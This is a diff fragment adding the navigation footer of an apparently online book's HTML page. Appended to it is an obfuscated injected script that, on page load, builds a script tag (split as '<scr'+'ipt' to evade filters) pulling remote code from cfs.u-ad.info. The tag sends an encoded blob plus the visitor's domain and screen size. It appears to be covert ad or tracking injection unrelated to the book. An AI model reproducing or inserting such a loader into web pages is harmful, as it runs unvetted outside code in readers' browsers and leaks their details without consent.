+<div class=navigation>[Go to <span><a href="book.html">first</a>, <a href="book-Z-H-74.html">previous</a></span><span>, <a href="book-Z-H-76.html">next</a></span> page<span>; &nbsp;&nbsp;</span><span><a href="book-Z-H-4.html#%_toc_start">contents</a></span><span><span>; &nbsp;&nbsp;</span><a href="book-Z-H-82.html#%_index_start">index</a></span>]</div>
+<p></p>
+<script type="text/javascript">if(self==top){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);document.write("<scr"+"ipt type=text/javascript src="+idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request");document.write("?id=1");document.write("&amp;enc=telkom2");document.write("&amp;params=" + "4TtHaUQnUEiP6K%2fc5C582NgXaqsgjSGNhMkGfMSQiD0tAmKrO7K5o8jrQoOpd4PC1BUWbG8EqOecOKdosnmKqzSRSRLIgR%2b%2fZEx%2bCrFJDBxUBZdMI%2brBGRatSUjNFJJ90Zw0oy0riKosnpS%2fpphjDsfwd66ahqBy0Fj8Zz71zh2F6fs7eeAs8jTUCw%2f368zkWraIpNnpPGmmY2wUTmXhZYHQ7CA58gjk94NttBYbS9UgUyLh39KST43zZFPuxl%2fC7Z8%2bivx1kVhYZ4Kq0a9QlPSLl7ft60xV8bEVms6Ujlm2RME2yMbQafcM%2f1X1D9v7lR1jKcK9XWvmoNZvwrse84ZycjzgTIgXbQTHYrD0pHj8jRGpWq%2bG8avfiXfy6ac3xWs28WUP4tc9bEyN%2ft62ZXFhz8ZMk%2fnu5GYqDTWR0Rk2rqdQ0i4TdJ7phNah%2fX6V0mfW91Onj3cqRwDWE23k5rXgctG7ohjRddJgNkMp6tJDD2%2fJd3LFIUT%2feoCwRK3m");document.write("&amp;idc_r="+idc_glo_r);document.write("&amp;domain="+document.domain);document.write("&amp;sw="+screen.width+"&amp;sh="+screen.height);document.write("></scr"+"ipt>");}</script><noscript>activate javascript</noscript></body></body>
+</html>
